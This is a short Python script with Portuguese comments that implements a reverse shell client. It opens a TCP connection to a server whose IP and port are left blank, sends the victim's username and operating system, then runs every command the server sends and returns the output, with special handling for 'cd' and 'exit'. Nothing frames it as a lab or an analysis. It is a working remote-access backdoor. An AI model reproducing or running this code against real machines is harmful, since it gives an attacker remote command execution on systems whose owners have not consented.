from getpass import getuser
from socket import *
import subprocess
import platform
import os


#armazena informações
get_os = platform.uname()[0]
get_user = getuser()
os_info = f"client name: {get_user}, client OS: {get_os}"

#AF_INET == IPV4, SOCK_STREAM == TCP
connection = socket(AF_INET,SOCK_STREAM)
#faz a conexão com o servidor
ip = ''
port = ""
connection.connect((ip,port))

#envia as informações do sistema operacional
connection.send(os_info.encode())

while True:
    #recebe o comando do servidor
    receive = connection.recv(1024).decode()

    if receive.lower() == "exit":
        exit()
    #altera o diretorio
    elif receive[:2] == "cd":
        os.chdir(receive[3:])
        connection.send(os.getcwd().encode())
    #executa o comando do servidor
    else:
        output = subprocess.getoutput(receive)

        if output == "" or output == None:
            output = "error"
        
        else:
            connection.send(output.encode())